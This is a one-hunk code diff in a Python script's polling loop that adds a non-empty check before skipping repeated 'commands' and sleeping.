@@ -150,7 +150,7 @@ if __name__ == '__main__':
         # print(commands)
 
         # avoid same upload operations
-        if commands == oldCommands:
+        if commands != [] and commands == oldCommands:
             print(f"[*] Same commands received. Going to sleep for {interval} second ...")
             continue
         else: oldCommands = commands
